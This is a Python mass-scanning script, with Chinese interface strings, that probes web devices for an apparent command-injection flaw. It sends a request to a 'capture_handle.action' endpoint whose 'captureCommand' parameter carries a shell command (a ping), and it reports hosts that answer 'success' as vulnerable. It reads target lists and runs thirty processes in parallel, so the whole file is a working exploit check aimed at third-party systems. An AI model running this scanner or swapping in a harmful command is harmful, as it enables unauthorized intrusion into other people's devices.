import requests
from multiprocessing import Pool
import warnings
import argparse

warnings.filterwarnings("ignore")
headers={
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept': '*/*',
    'Connection': 'close',
    'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2'
}
def main():
    argparser = argparse.ArgumentParser("检测工具")
    argparser.add_argument("-u", "--url", dest="target", help="检测url")
    argparser.add_argument("-f", "--file", dest="file", help="批量检测")
    arg=argparser.parse_args()
    pool = Pool(processes=30)
    targets=[]
    if arg.target:
        check(arg.target)
    elif arg.file:
        try:
            with open(arg.file,"r",encoding="utf-8") as f:
                line = f.readlines()
                for line in line:
                    if "http" in line:
                        line = line.strip()
                        targets.append(line)
                    else:
                        line="http://"+line
                        targets.append(line)
        except Exception as e:
            print("[ERROR]")
        pool.map(check,targets)


def check(target):
    target=f"{target}/config/asst/system_setPassWordValidate.action/capture_handle.action?captureFlag=true&captureCommand=ping www.baidu.com index.pcap"
    r=requests.get(target,headers=headers,verify=False,timeout=3)

    if r.status_code==200 and "success" in r.text:
        print(f"存在漏洞{target}")
if __name__ == '__main__':
    main()